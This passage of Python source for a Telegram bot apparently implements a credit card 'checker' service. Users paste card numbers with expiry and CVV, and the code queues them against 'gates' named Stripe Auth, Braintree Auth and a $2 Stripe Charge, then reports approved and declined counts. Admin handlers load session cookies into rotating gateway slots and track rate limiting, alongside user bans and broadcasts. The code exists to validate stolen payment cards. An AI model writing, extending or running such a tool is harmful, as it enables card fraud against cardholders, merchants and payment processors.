            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
    
    # Authorization Check - Block ALL unauthorized users
    if is_authorization_enabled() and not is_user_authorized(user_id):
        await update.message.reply_text(
            "🚫 **ACCESS DENIED** 🚫\n\n"
            "❌ You are not authorized to use this bot.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
        
    if not is_authorized(user_id):
        await update.message.reply_text("🚫 **ACCESS DENIED** - Unauthorized user!")
        return
    
    text = update.message.text
    
    # Handle reply keyboard buttons first
    if text == "⏸️ Pause":
        await pause_command(update, context)
        return
    elif text == "⏹️ Stop":
        await stop_command(update, context)
        return
    elif text == "🔄 Resume":
        await resume_command(update, context)
        return
        
    # Check if user is in /sb session
    if context.user_data.get('waiting_for_sb'):
        context.user_data['waiting_for_sb'] = False # Reset flag
        
        import re
        # Stronger regex for CC detection
        cards = re.findall(r'\d{13,19}[^\d]\d{1,2}[^\d]\d{2,4}[^\d]\d{3,4}', text)
        if cards:
            # Normalize cards to standard format
            normalized_cards = []
            for card in cards:
                parts = re.split(r'[^\d]', card)
                if len(parts) == 4:
                    cc, mm, yy, cvv = parts
                    if len(yy) == 4:
                        yy = yy[-2:]
                    normalized_cards.append(f"{cc}|{mm}|{yy}|{cvv}")
            
            if normalized_cards:
                import tempfile
                with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
                    temp_file_path = temp_file.name
                asyncio.create_task(start_checking(update, context, temp_file_path, normalized_cards, gate_priority='sb'))

        else:
            await update.message.reply_text("❌ No valid cards found! Format: `CC|MM|YY|CVV`", parse_mode='Markdown')
        return
    elif text == "📊 Status":
        # Show current session status
        user_sessions = [sid for sid, session in checking_sessions.items() 
                        if session['user_id'] == user_id and session['active']]
        if user_sessions:
            status_text = "📊 CURRENT STATUS 📊\n\n"
            for session_id in user_sessions:
                session = checking_sessions[session_id]
                status_text += f"🔄 Session: {session_id[:20]}...\n"
                status_text += f"📊 Progress: {session['current_index']}/{session['total_cards']}\n"
                status_text += f"✅ Approved: {session['approved_count']}\n"
                status_text += f"❌ Declined: {session['declined_count']}\n"
                if session_id in paused_sessions:
                    status_text += f"⏸️ Status: PAUSED\n\n"
                else:
                    status_text += f"🚀 Status: RUNNING\n\n"
        else:
            status_text = "📊 No active card checking sessions found."
        
        await update.message.reply_text(status_text, parse_mode='Markdown')
        return

    # ========== GATEWAY SLOT UPDATE HANDLERS ==========
    # Check if admin is selecting a slot number
    if context.user_data.get('waiting_for_gateway_slot'):
        if not is_admin(user_id): return
        try:
            slot_num = int(text.strip())
            if 1 <= slot_num <= 10:
                context.user_data['waiting_for_gateway_slot'] = False
                context.user_data['selected_slot'] = slot_num
                context.user_data['waiting_for_slot_cookies'] = True
                await update.message.reply_text(
                    f"📝 **SLOT {slot_num} SELECTED**\n\n"
                    f"Now paste the cookies dictionary:\n"
                    f"(JSON or Python dict format)",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Invalid slot! Enter 1-10.")
        except:
            await update.message.reply_text("❌ Invalid input! Enter a number 1-10.")
        return
    
    # Check if admin is selecting slot for JSON cookies upload
    if context.user_data.get('waiting_for_json_slot'):
        if not is_admin(user_id): return
        try:
            slot_num = int(text.strip())
            if 1 <= slot_num <= 10:
                pending_cookies = context.user_data.get('pending_json_cookies', {})
                if pending_cookies:
                    add_cookies_to_slot(slot_num, pending_cookies)
                    await update.message.reply_text(
                        f"✅ **SLOT {slot_num} UPDATED!**\n\n"
                        f"🍪 Cookies added successfully ({len(pending_cookies)} cookies)\n"
                        f"📊 Active Slots: {get_active_slot_count()}/{MAX_GATEWAY_SLOTS}",
                        parse_mode='Markdown'
                    )
                else:
                    await update.message.reply_text("❌ No pending cookies found!")
                
                context.user_data['waiting_for_json_slot'] = False
                context.user_data['pending_json_cookies'] = None
            else:
                await update.message.reply_text("❌ Invalid slot! Enter 1-10.")
        except:
            await update.message.reply_text("❌ Invalid input! Enter a number 1-10.")
        return
    
    # Check if admin is sending cookies for a slot
    if context.user_data.get('waiting_for_slot_cookies'):
        if not is_admin(user_id): return
        slot_num = context.user_data.get('selected_slot', 1)
        try:
            import ast
            import re
            content = text
            
            # Remove markdown code blocks
            if content.startswith("```"):
                content = content.strip("`").replace("json", "").replace("python", "").strip()
            
            # Auto-fix common cookie format issues
            # Remove any leading/trailing whitespace
            content = content.strip()
            
            # If it looks like key:value pairs without quotes, try to fix
            # Example: tk_or: "%22%22" -> "tk_or": "%22%22"
            if ':' in content and not content.startswith('{'):
                # Split into lines and process each
                lines = content.split('\n')
                fixed_lines = []
                for line in lines:
                    line = line.strip()
                    if ':' in line and not line.startswith('"'):
                        # Try to add quotes around key
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            key = parts[0].strip().strip('"').strip("'")
                            value = parts[1].strip().rstrip(',')
                            fixed_lines.append(f'  "{key}": {value}')
                    else:
                        fixed_lines.append(line)
                content = '{\n' + ',\n'.join(fixed_lines) + '\n}'
            
            # Add braces if missing
            if not content.strip().startswith("{"):
                content = "{" + content
            if not content.strip().endswith("}"):
                content = content + "}"
            
            # Try JSON first, then Python literal eval
            try:
                new_cookies = json.loads(content)
            except json.JSONDecodeError as je:
                try:
                    new_cookies = ast.literal_eval(content)
                except Exception as ae:
                    # Last resort: try to extract key-value pairs manually
                    new_cookies = {}
                    for match in re.finditer(r'["\']?([^"\':]+)["\']?\s*:\s*["\']([^"\',}]+)["\']', content):
                        key, value = match.groups()
                        new_cookies[key.strip()] = value.strip()
                    
                    if not new_cookies:
                        raise ValueError(f"Could not parse cookies. JSON error: {str(je)}, AST error: {str(ae)}")
            
            if not isinstance(new_cookies, dict):
                raise ValueError("Not a valid dictionary")
            
            if not new_cookies:
                raise ValueError("Empty cookies dictionary")
            
            add_cookies_to_slot(slot_num, new_cookies)
            await update.message.reply_text(
                f"✅ **SLOT {slot_num} UPDATED!**\n\n"
                f"🍪 Cookies added successfully ({len(new_cookies)} cookies)\n"
                f"📊 Active Slots: {get_active_slot_count()}/{MAX_GATEWAY_SLOTS}",
                parse_mode='Markdown'
            )
            
            context.user_data['waiting_for_slot_cookies'] = False
            context.user_data['selected_slot'] = None
            
        except Exception as e:
            error_msg = str(e)
            await update.message.reply_text(
                f"❌ **Failed to parse cookies**\n\n"
                f"Error: {error_msg}\n\n"
                f"💡 **Tips:**\n"
                f"• Paste cookies in JSON format\n"
                f"• Or paste as Python dict\n"
                f"• Make sure format is correct",
                parse_mode='Markdown'
            )
        return
    
    # Check if admin wants to clear a slot
    if context.user_data.get('waiting_for_clear_slot'):
        if not is_admin(user_id): return
        try:
            slot_num = int(text.strip())
            if 1 <= slot_num <= 10:
                clear_slot(slot_num)
                await update.message.reply_text(
                    f"✅ **SLOT {slot_num} CLEARED!**\n\n"
                    f"📊 Active Slots: {get_active_slot_count()}/{MAX_GATEWAY_SLOTS}",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Invalid slot! Enter 1-10.")
        except:
            await update.message.reply_text("❌ Invalid input! Enter a number 1-10.")
        context.user_data['waiting_for_clear_slot'] = False
        return
    
    # Credit Check
    stats = get_user_stats(user_id)
    
    # DISABLED: Direct card detection - users must use commands
    # Cards will only be processed via /au or /sb commands
    
    # Check if user is waiting for cards after using /au or /sb
    if context.user_data.get('waiting_for_au'):
        # Extract cards from text
        cards = extract_multiple_cards_from_text(text)
        if cards:
            context.user_data['waiting_for_au'] = False
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
                temp_file_path = temp_file.name
            asyncio.create_task(start_checking(update, context, temp_file_path, cards, gate_priority='au'))
        else:
            await update.message.reply_text(
                "❌ **No valid cards found!**\n\n"
                "Please send cards in format: `CC|MM|YY|CVV`",
                parse_mode='Markdown'
            )
        return
    
    # Check if user is waiting for cards after using /ba
    if context.user_data.get('waiting_for_ba'):
        # Extract cards from text
        cards = extract_multiple_cards_from_text(text)
        if cards:
            context.user_data['waiting_for_ba'] = False
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
                temp_file_path = temp_file.name
            asyncio.create_task(start_checking(update, context, temp_file_path, cards, gate_priority='ba'))
        else:
            await update.message.reply_text(
                "❌ **No valid cards found!**\n\n"
                "Please send cards in format: `CC|MM|YY|CVV`",
                parse_mode='Markdown'
            )
        return
    
    # No automatic card detection - show help message
    if update.effective_chat.type == 'private':
        # Check if message looks like cards
        if '|' in text and any(c.isdigit() for c in text):
            await update.message.reply_text(
                "💡 **Please use a command to check cards:**\n\n"
                "🔹 `/au` - Stripe Auth 💎\n"
                "🔹 `/ba` - Braintree Auth 🔐\n"
                "🔹 `/sb` - Stripe Charge ($2) ✅\n\n"
                "Use any command to check your cards!",
                parse_mode='Markdown'
            )

async def button_callback_OLD(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks. (DEPRECATED - MERGED INTO NEW FUNCTION)"""
    query = update.callback_query
    user_id = query.from_user.id
    
    print(f"DEBUG: Button callback received - Data: {query.data}, User: {user_id}")
    print(f"DEBUG: Maintenance Mode: {is_maintenance_mode()}, Is Admin: {is_admin(user_id)}")
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        # Allow only admin buttons to work during maintenance (to turn it off)
        if not query.data.startswith("admin_"):
            await query.answer("🚧 Bot is under maintenance. Please try again later.", show_alert=True)
            return

    try:
        await query.answer()
    except Exception as e:
        print(f"DEBUG: Error in query.answer(): {e}")
    
    # Handle file checking buttons
    if query.data.startswith("check_all_"):
        temp_file_path = query.data.replace("check_all_", "")
        
        # Read the file again
        with open(temp_file_path, 'r', encoding='utf-8') as f:
            valid_cards = [line.strip() for line in f if line.strip()]
        
        await query.edit_message_text("🚀 **Starting card check...**", parse_mode='Markdown')
        # Run card checking as background task to keep bot responsive
        asyncio.create_task(start_checking(query, context, temp_file_path, valid_cards))
        
    elif query.data == "cancel_check":
        await query.edit_message_text("❌ **Check cancelled.**", parse_mode='Markdown')
    
    # Handle admin panel buttons
    elif query.data.startswith("admin_"):
        if not is_admin(user_id):
            await query.edit_message_text("🚫 **ACCESS DENIED** - Admin only!", parse_mode='Markdown')
            return
        
        if query.data == "admin_adduser":
            await query.edit_message_text(
                "👤 **ADD USER**\n\n"
                "To add a new user, use the command:\n"
                "`/adduser <user_id>`\n\n"
                "**Example:** `/adduser 123456789`\n\n"
                "💡 **Tip:** Ask the user to send `/start` to get their User ID.",
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_removeuser":
            await query.edit_message_text(
                "🗑️ **REMOVE USER**\n\n"
                "To remove a user, use the command:\n"
                "`/removeuser <user_id>`\n\n"
                "**Example:** `/removeuser 123456789`\n\n"
                "⚠️ **Note:** You cannot remove the main admin.",
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_listusers":
            users_list = "👑 **AUTHORIZED USERS LIST**\n\n"
            for i, uid in enumerate(sorted(authorized_users), 1):
                status = "👑 ADMIN" if uid == ADMIN_ID else "✅ USER"
                users_list += f"{i}. `{uid}` - {status}\n"
            
            users_list += f"\n🎯 **Total Users:** {len(authorized_users)}"
            
            # Add back button
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(users_list, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif query.data == "admin_stats":
            # Count online users and total stats
            online_count = sum(1 for stats in user_tracking.values() if is_user_online(stats.get('last_active', '')))
            total_cards = sum(stats.get('total_cards_checked', 0) for stats in user_tracking.values())
            total_approved = sum(stats.get('cards_approved', 0) for stats in user_tracking.values())
            total_declined = sum(stats.get('cards_declined', 0) for stats in user_tracking.values())
            
            stats_text = (
                f"📊 BOT STATISTICS\n\n"
                f"👑 Admin: {ADMIN_ID}\n"
                f"👥 Authorized Users: {len(authorized_users)}\n"
                f"📊 Tracked Users: {len(user_tracking)}\n"
                f"🟢 Online Now: {online_count}\n"
                f"🔑 Auth Mode: {'ENABLED' if is_authorization_enabled() else 'DISABLED'}\n\n"
                f"💳 Card Statistics:\n"
                f"   • Total Checked: {total_cards}\n"
                f"   • ✅ Approved: {total_approved}\n"
                f"   • ❌ Declined: {total_declined}\n"
                f"   • 📈 Success Rate: {(total_approved/total_cards*100) if total_cards > 0 else 0:.1f}%\n\n"
                f"🎯 Features Active:\n"
                f"• Card Checking ✅\n"
                f"• BIN Lookup ✅\n"
                f"• File Upload ✅\n"
                f"• Multi-Card Text ✅\n"
                f"• User Tracking ✅\n"
                f"• Admin Panel ✅"
            )
            
            # Add back button
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(stats_text, reply_markup=reply_markup)
        
        elif query.data == "admin_allusers":
            # Show all users with stats
            if not user_tracking:
                msg = "📭 No users tracked yet!"
            else:
                msg = "📊 **ALL USERS STATS** 📊\n"
                msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                
                for i, (uid, stats) in enumerate(list(user_tracking.items())[:15], 1):  # Limit to 15 users
                    username = stats.get('username') or 'N/A'
                    first_name = stats.get('first_name') or 'Unknown'
                    last_active = stats.get('last_active', 'Never')
                    time_ago = get_time_ago(last_active)
                    online_status = "🟢" if is_user_online(last_active) else "🔴"
                    
                    cards_checked = stats.get('total_cards_checked', 0)
                    cards_approved = stats.get('cards_approved', 0)
                    cards_declined = stats.get('cards_declined', 0)
                    
                    msg += f"{i}. {online_status} {first_name} (@{username})\n"
                    msg += f"   `{uid}` | 📊 {cards_checked} | ✅ {cards_approved} | ❌ {cards_declined}\n"
                    msg += f"   ⏰ {time_ago}\n\n"
                
                if len(user_tracking) > 15:
                    msg += f"... and {len(user_tracking) - 15} more users.\n"
                    msg += "Use `/allusers` for full list.\n"
                
                msg += f"\n📈 **Total Tracked:** {len(user_tracking)} users"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif query.data == "admin_onlineusers":
            # Show online users
            online_users = [(uid, stats) for uid, stats in user_tracking.items() 
                           if is_user_online(stats.get('last_active', ''))]
            
            if not online_users:
                msg = "🔴 **NO ONLINE USERS** 🔴\n\nNo users have been active in the last 5 minutes."
            else:
                msg = "🟢 **ONLINE USERS** 🟢\n"
                msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                
                for i, (uid, stats) in enumerate(online_users, 1):
                    username = stats.get('username') or 'N/A'
                    first_name = stats.get('first_name') or 'Unknown'
                    time_ago = get_time_ago(stats.get('last_active', ''))
                    
                    msg += f"{i}. 🟢 {first_name} (@{username})\n"
                    msg += f"   ID: `{uid}` | Active: {time_ago}\n\n"
                
                msg += f"✨ **Total Online:** {len(online_users)} users"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif query.data == "admin_userlookup":
            await query.edit_message_text(
                "🔍 **USER LOOKUP**\n\n"
                "To view detailed stats for a specific user, use the command:\n"
                "`/userstats <user_id>`\n\n"
                "**Example:** `/userstats 123456789`\n\n"
                "💡 **Tip:** Use `/allusers` to see all user IDs.",
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_usagereport":
            # Generate usage report
            total_cards = sum(stats.get('total_cards_checked', 0) for stats in user_tracking.values())
            total_approved = sum(stats.get('cards_approved', 0) for stats in user_tracking.values())
            total_declined = sum(stats.get('cards_declined', 0) for stats in user_tracking.values())
            total_bins = sum(stats.get('features_used', {}).get('bin_lookup', 0) for stats in user_tracking.values())
            total_files = sum(stats.get('features_used', {}).get('file_upload', 0) for stats in user_tracking.values())
            
            # Find top users
            top_users = sorted(user_tracking.items(), 
                             key=lambda x: x[1].get('total_cards_checked', 0), 
                             reverse=True)[:5]
            
            msg = "📈 **USAGE REPORT** 📈\n"
            msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            msg += f"💳 **Total Cards Checked:** {total_cards}\n"
            msg += f"✅ **Total Approved:** {total_approved}\n"
            msg += f"❌ **Total Declined:** {total_declined}\n"
            msg += f"📈 **Overall Success Rate:** {(total_approved/total_cards*100) if total_cards > 0 else 0:.1f}%\n\n"
            msg += f"🔍 **BIN Lookups:** {total_bins}\n"
            msg += f"📁 **Files Uploaded:** {total_files}\n\n"
            
            if top_users:
                msg += "🏆 **TOP 5 USERS:**\n"
                for i, (uid, stats) in enumerate(top_users, 1):
                    first_name = stats.get('first_name') or 'Unknown'
                    cards = stats.get('total_cards_checked', 0)
                    msg += f"   {i}. {first_name}: {cards} cards\n"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif query.data == "admin_toggleauth":
            # Toggle authorization mode
            new_state = toggle_authorization()
            
            if new_state:
                msg = "🔐 AUTHORIZATION ENABLED 🔐\n\n"
                msg += "✅ Authorization is now ON.\n"
                msg += "⚠️ Only authorized users can use the bot.\n"
                msg += "📝 Use /adduser to add users."
            else:
                msg = "🔓 AUTHORIZATION DISABLED 🔓\n\n"
                msg += "✅ Authorization is now OFF.\n"
                msg += "🌐 All users can now use the bot.\n"
                msg += "📊 User activity will still be tracked."
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup)
        
        elif query.data == "admin_punish":
            await query.edit_message_text(
                "🚫 **USER PUNISHMENT SYSTEM** 🚫\n\n"
                "Use commands to punish users:\n\n"
                "🔨 **Permanent Ban:**\n"
                "`/ban <user_id>`\n\n"
                "⏳ **Timed Suspension:**\n"
                "`/suspend <user_id> <time>`\n"
                "*Example:* `/suspend 12345 1d 12h`\n\n"
                "✅ **Unban/Remove Punish:**\n"
                "`/unban <user_id>`\n\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "💡 *Note:* Users are automatically notified when unbanned.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]),
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_broadcast":
            # Show broadcast instructions
            msg = "📢 BROADCAST TO ALL USERS\n\n"
            msg += "Use the command:\n"
            msg += "/broadcast Your message here\n\n"
            msg += "To send photo:\n"
            msg += "1. Send or forward a photo\n"
            msg += "2. Reply to it with /broadcast\n"
            msg += "   Or /broadcast Your caption\n\n"
            msg += f"📊 Total users: {len(user_tracking)}"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup)
        
        elif query.data == "admin_sendto":
            # Show sendto instructions
            msg = "📨 SEND TO SPECIFIC USER\n\n"
            msg += "Use the command:\n"
            msg += "/sendto <user_id> <message>\n\n"
            msg += "Example:\n"
            msg += "/sendto 123456789 Hello!\n\n"
            msg += "To send photo:\n"
            msg += "Reply to a photo with:\n"
            msg += "/sendto <user_id> caption\n\n"
            msg += "Use /allusers to see user IDs"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup)
        
        elif query.data == "admin_togglemaint":
            # Toggle maintenance mode
            new_state = toggle_maintenance()
            status_text = "ENABLED 🚧" if new_state else "DISABLED ✅"
            await query.edit_message_text(
                f"🚧 **MAINTENANCE MODE {status_text}**\n\n"
                f"Maintenance is now {'ON' if new_state else 'OFF'}.\n"
                f"{'Normal users cannot use the bot.' if new_state else 'All users can use the bot now.'}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]),
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_page_1":
            await show_admin_panel(query, context, page=1)
        elif query.data == "admin_page_2":
            await show_admin_panel(query, context, page=2)
        
        # ========== GATEWAY MANAGEMENT CALLBACKS ==========
        elif query.data == "admin_update_cookies":
            await query.answer()
            context.user_data['waiting_for_gateway_slot'] = True
            
            # Show available slots
            slots = gateway_cookies.get("gateway_slots", [])
            slot_status = "🍪 **UPDATE GATEWAY COOKIES**\n━━━━━━━━━━━━━━━━━━━━\n\n"
            for slot in slots:
                status = "✅" if slot.get("cookies") else "⬜"
                slot_status += f"{status} Slot {slot['slot_id']}"
                if slot.get("cookies"):
                    slot_status += f" (Usage: {slot.get('usage_count', 0)})"
                slot_status += "\n"
            
            slot_status += "\n📝 Reply with slot number (1-10):"
            
            await query.edit_message_text(
                slot_status,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_page_2")]]),
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_view_slots":
            slots = gateway_cookies.get("gateway_slots", [])
            msg = "📋 **GATEWAY SLOTS STATUS**\n━━━━━━━━━━━━━━━━━━━━\n\n"
            
            for slot in slots:
                if slot.get("cookies"):
                    status = "🟢 Active" if slot.get("active", True) else "🔴 Rate Limited"
                    msg += f"**Slot {slot['slot_id']}:** {status}\n"
                    msg += f"   Usage: {slot.get('usage_count', 0)}\n"
                    if slot.get("last_error"):
                        msg += f"   ⚠️ {slot['last_error'][:30]}...\n"
                else:
                    msg += f"**Slot {slot['slot_id']}:** ⬜ Empty\n"
            
            await query.edit_message_text(
                msg,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_page_2")]]),
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_clear_slot":
            context.user_data['waiting_for_clear_slot'] = True
            await query.edit_message_text(
                "🗑️ **CLEAR GATEWAY SLOT**\n\n"
                "Reply with the slot number (1-10) to clear:",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_page_2")]]),
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_reset_usage":
            reset_all_slot_usage()
            await query.edit_message_text(
                "✅ **USAGE RESET**\n\n"
                "All gateway slot usage counts have been reset to 0.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_page_2")]]),
                parse_mode='Markdown'
            )

        elif query.data == "admin_togglesb":
            # Toggle /sb privacy mode
            new_state = toggle_sb_privacy()
            status_text = "PRIVATE 🔒" if new_state else "PUBLIC 🔓"
            await query.edit_message_text(
                f"💳 **/sb GATE PRIVACY: {status_text}**\n\n"
                f"The Stripe Charge (/sb) gate is now {'PRIVATE' if new_state else 'PUBLIC'}.\n"
                f"{'Only authorized users and admins can use it.' if new_state else 'All users can use it now.'}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"✨ Users will be notified if they try to access a private gate.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]),
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_back":
            # Recreate admin panel using helper
            await show_admin_panel(query, context, page=1)
        
        elif query.data == "admin_close":
            await query.edit_message_text("👑 Admin panel closed. 👑")

    
    # Handle pause/stop/resume buttons for card checking
    elif query.data.startswith("pause_"):
        session_id = query.data.replace("pause_", "")
        print(f"DEBUG: Pause button clicked for session {session_id}")
        
        # INSTANT response to user
        await query.answer("⏸️ Pausing card checking...")
        
        if session_id in checking_sessions and checking_sessions[session_id]['user_id'] == user_id:
            # Check if session is already completed
            if checking_sessions[session_id].get('completed', False):
                await query.edit_message_text("ℹ️ Card checking already completed!")
                return
                
            if session_id not in paused_sessions:
                paused_sessions.add(session_id)
                print(f"DEBUG: Session {session_id} added to paused_sessions - INSTANT")
                
                # Update button immediately to show resume option
                keyboard = [
                    [
                        InlineKeyboardButton("▶️ Resume", callback_data=f"resume_{session_id}"),
                        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_{session_id}")
                    ]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                session = checking_sessions[session_id]
                
                # Instant message update
                await query.edit_message_text(
                    "⏸️ CARD CHECKING PAUSED ⏸️\n\n"
                    "🔄 Process has been temporarily paused.\n"
                    f"📊 Current Progress: {session['current_index']}/{session['total_cards']}\n"
                    f"✅ Approved: {session['approved_count']}\n"
                    f"❌ Declined: {session['declined_count']}\n\n"
                    "▶️ Click Resume to continue checking.\n"
                    "⏹️ Click Stop to terminate completely.",
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text("⚠️ Session already paused!")
        else:
            await query.edit_message_text("❌ Session not found or unauthorized!")
    
    elif query.data.startswith("resume_"):
        session_id = query.data.replace("resume_", "")
        print(f"DEBUG: Resume button clicked for session {session_id}")
        if session_id in checking_sessions and checking_sessions[session_id]['user_id'] == user_id:
            if session_id in paused_sessions:
                paused_sessions.remove(session_id)
                print(f"DEBUG: Session {session_id} removed from paused_sessions")
                # Update button back to pause/stop
                keyboard = [
                    [
                        InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_{session_id}"),
                        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_{session_id}")
                    ]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                session = checking_sessions[session_id]
                await query.edit_message_text(
                    "▶️ CARD CHECKING RESUMED ▶️\n\n"
                    "🔄 Process has been resumed.\n"
                    f"📊 Progress: {session['current_index']}/{session['total_cards']}\n"
                    f"✅ Approved: {session['approved_count']}\n"
                    f"❌ Declined: {session['declined_count']}\n\n"
                    "Use the buttons below to control the process:",
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
            else:
                await query.answer("⚠️ Not paused!")
        else:
            await query.answer("❌ Session not found or unauthorized!")
    
    elif query.data.startswith("stop_"):
        session_id = query.data.replace("stop_", "")
        print(f"DEBUG: Stop button clicked for session {session_id}")
        
        # INSTANT response to user
        await query.answer("⏹️ Stopping card checking...")
        
        if session_id in checking_sessions and checking_sessions[session_id]['user_id'] == user_id:
            # Check if session is already completed
            if checking_sessions[session_id].get('completed', False):
                await query.edit_message_text("ℹ️ Card checking already completed!")
                return
                
            # Mark session as inactive IMMEDIATELY
            checking_sessions[session_id]['active'] = False
            print(f"DEBUG: Session {session_id} marked as inactive - INSTANT")
            # Remove from paused sessions if it was paused
            if session_id in paused_sessions:
                paused_sessions.remove(session_id)
                print(f"DEBUG: Session {session_id} removed from paused_sessions - INSTANT")
            
            session = checking_sessions[session_id]
            success_rate = (session['approved_count'] / session['current_index'] * 100) if session['current_index'] > 0 else 0
            
            # Instant message update
            await query.edit_message_text(
                "⏹️ CARD CHECKING STOPPED ⏹️\n\n"
                "🛑 Process has been terminated by user.\n"
                f"📊 Final Progress: {session['current_index']}/{session['total_cards']}\n"
                f"✅ Approved: {session['approved_count']}\n"
                f"❌ Declined: {session['declined_count']}\n"
                f"📈 Success Rate: {success_rate:.1f}%\n\n"
                "🔄 You can start a new check anytime!",
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text("❌ Session not found or unauthorized!")
    
    elif query.data == "get_credits":
        await query.answer("ℹ️ Credit system is disabled. All checks are free!", show_alert=True)
        await query.edit_message_text("ℹ️ **The credit system has been disabled.**\n\nAll card checking features are now free for authorized users! 🚀")

async def start_checking(update_or_query, context: ContextTypes.DEFAULT_TYPE, temp_file_path: str, cards: list, gate_priority='cookies') -> None:
    """Start the card checking process."""
    total_cards = len(cards)
    approved_count = 0
    declined_count = 0
    
    # Send initial message
    if hasattr(update_or_query, 'message'):
        chat_id = update_or_query.message.chat_id
        user_id = update_or_query.message.from_user.id
        message_method = update_or_query.message.reply_text
    else:
        chat_id = update_or_query.message.chat_id if hasattr(update_or_query, 'message') else update_or_query.from_user.id
        user_id = update_or_query.from_user.id
        message_method = lambda text, **kwargs: context.bot.send_message(chat_id, text, **kwargs)
    
    # Create session ID for this checking process
    import time
    session_id = f"{user_id}_{chat_id}_{int(time.time())}"
    checking_sessions[session_id] = {
        'user_id': user_id,
        'chat_id': chat_id,
        'total_cards': total_cards,
        'current_index': 0,
        'approved_count': 0,
        'declined_count': 0,
        'cards': cards,
        'temp_file_path': temp_file_path,
        'active': True,
        'context': context
    }
    
    # Track user session count
    stats = get_user_stats(user_id)
    stats['sessions_count'] = stats.get('sessions_count', 0) + 1
    save_user_tracking()
    
    # Send engaging starting message with reply keyboard buttons
    from telegram import ReplyKeyboardMarkup, KeyboardButton
    
    keyboard = [
        [
            KeyboardButton("⏸️ Pause"),
            KeyboardButton("⏹️ Stop")
        ],
        [
            KeyboardButton("📊 Status"),
            KeyboardButton("🔄 Resume")
        ]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
    
    print(f"DEBUG: Creating reply keyboard buttons for session {session_id}")
    
    start_text = (
        f"💎✨ **CARD VERIFICATION INITIATED** ✨💎\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Total Cards:** {total_cards}\n"
        f"🔌 **Gate:** {gate_priority.upper()}\n"
        f"⚡ **Status:** Processing...\n"
    )
    
    if gate_priority == 'sb':
        start_text += f"🛡️ **Security Protocol:** 60s/card active\n"
        
    start_text += (
